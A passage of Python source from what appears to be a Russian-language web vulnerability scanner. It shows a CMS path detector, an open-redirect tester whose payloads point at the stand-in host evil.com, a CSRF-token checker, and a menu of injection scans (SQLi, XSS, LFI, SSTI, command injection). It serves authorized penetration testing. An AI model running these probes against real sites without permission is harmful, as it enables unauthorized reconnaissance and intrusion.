                "<th>URL</th></tr>",
            ]
            for r in sorted(found, key=lambda x: x["status"]):
                parts.append(
                    f"<tr><td>{r['status']}</td>"
                    f"<td>{r.get('length', '')}</td>"
                    f"<td>{html_mod.escape(r['url'])}</td></tr>")
            parts.append("</table></body></html>")
            path.write_text("\n".join(parts), encoding="utf-8")
        console.print(f"[green]✓ {fmt.upper()}: {path}[/green]")
        return path
    except Exception as exc:
        console.print(f"[red]Экспорт: {exc}[/red]")
        return None


# ===========================================================================
# CMS detect
# ===========================================================================

def cms_scanner(target: str) -> None:
    """Определение CMS."""
    if not confirm_external(target):
        return
    url = normalize_url(target).rstrip("/")
    results: dict[str, str] = {}
    checks = {
        "WordPress": ["/wp-login.php", "/wp-content/",
                       "/readme.html", "/xmlrpc.php"],
        "Joomla": ["/administrator/", "/components/",
                    "/language/en-GB/", "/configuration.php-dist"],
        "Drupal": ["/CHANGELOG.txt", "/core/CHANGELOG.txt",
                    "/user/login", "/sites/default/"],
        "Magento": ["/admin/", "/downloader/", "/app/etc/local.xml"],
        "PrestaShop": ["/admin", "/modules/", "/install/"],
    }
    for cms, paths in checks.items():
        for p in paths:
            r = _req(url + p)
            if r and r.status_code == 200:
                results[cms] = url + p
                console.print(f"[green]✓ {cms} → {url + p}[/green]")
                break
    if not results:
        console.print("[yellow]CMS не определён.[/yellow]")
    db.save_scan("cms", url, results)


# ===========================================================================
# Open redirect
# ===========================================================================

def open_redirect(target: str) -> None:
    """Поиск open redirect."""
    if not confirm_external(target):
        return
    url = normalize_url(target)
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    hits: list[dict] = []
    for param in qs:
        for payload in OPEN_REDIRECT_PAYLOADS:
            new_url = _inject_param(url, param, payload)
            r = _req(new_url)
            if not r:
                continue
            loc = r.headers.get("Location", "")
            if r.status_code in (301, 302, 303, 307, 308) and \
                    "evil.com" in loc:
                hits.append({"param": param, "payload": payload,
                              "location": loc})
                console.print(f"[red]⚠ Open Redirect: {param} → "
                              f"{payload}[/red]")
                break
    if hits:
        _save_finding(WebFinding(
            kind="open_redirect",
            severity="high",
            title=f"Open Redirect ({len(hits)})",
            target=url,
            evidence=json.dumps(hits, ensure_ascii=False)[:1500],
            data={"hits": hits},
        ))
    else:
        console.print("[green]Open Redirect не обнаружен.[/green]")
    db.save_scan("open_redirect", url, hits)


# ===========================================================================
# CSRF
# ===========================================================================

def csrf_checker(target: str) -> None:
    """CSRF-токен в формах."""
    if not confirm_external(target):
        return
    url = normalize_url(target)
    r = _req(url)
    if not r:
        return
    body = r.text.lower()
    has_form = "<form" in body
    has_token = any(t in body for t in
                     ("csrf", "_token", "authenticity_token", "xsrf",
                      "__requestverificationtoken"))
    console.print(f"[cyan]Форма:[/cyan] {has_form}")
    console.print(f"[cyan]CSRF-токен:[/cyan] "
                  f"{'[green]есть[/green]' if has_token else '[red]нет[/red]'}")
    if has_form and not has_token:
        _save_finding(WebFinding(
            kind="csrf_missing",
            severity="medium",
            title="Форма без CSRF-токена",
            target=url,
            evidence="<form> без csrf/_token/authenticity_token",
            data={"url": url},
        ))
    db.save_scan("csrf", url, {"has_form": has_form,
                                "has_csrf_token": has_token})


# ===========================================================================
# Меню
# ===========================================================================

def menu() -> None:
    """Меню модуля Web."""
    table = Table(title="[bold]Web Vulnerabilities (extended)[/bold]")
    table.add_column("№", style="yellow")
    table.add_column("Опция")
    opts = [
        ("1", "HTTP header analyzer (+info disclosure)"),
        ("2", "SSL/TLS checker"),
        ("3", "SQL Injection (error + time-based)"),
        ("4", "XSS (reflected)"),
        ("5", "LFI detector"),
        ("6", "SSTI detector"),
        ("7", "Command injection"),
        ("8", "NoSQL injection"),
        ("9", "CRLF injection"),
        ("10", "Host-header injection"),
        ("11", "CORS misconfig"),
        ("12", "JWT analysis"),
        ("13", "Directory brute-force"),
        ("14", "CMS scanner"),
        ("15", "Open redirect"),
        ("16", "CSRF token checker"),
    ]
    for n, t in opts:
        table.add_row(n, t)
    console.print(table)
    console.print("[yellow]⚠ Только для авторизованного пентеста.[/yellow]")
    c = Prompt.ask("Выбор", choices=[o[0] for o in opts])

    if c == "12":
        token = Prompt.ask("JWT")
        jwt_scan(token)
        return

    target = Prompt.ask("URL/цель")
    fn_map = {
        "1": header_analyzer,
        "2": ssl_checker,
        "3": sqli_scan,
        "4": xss_scan,
        "5": lfi_scan,
        "6": ssti_scan,
        "7": cmdi_scan,
        "8": nosql_scan,
        "9": crlf_scan,
        "10": host_header_scan,
        "11": cors_scan,
        "13": dir_bruteforce,
        "14": cms_scanner,
        "15": open_redirect,
        "16": csrf_checker,
    }
    fn = fn_map.get(c)
    if fn:
        fn(target)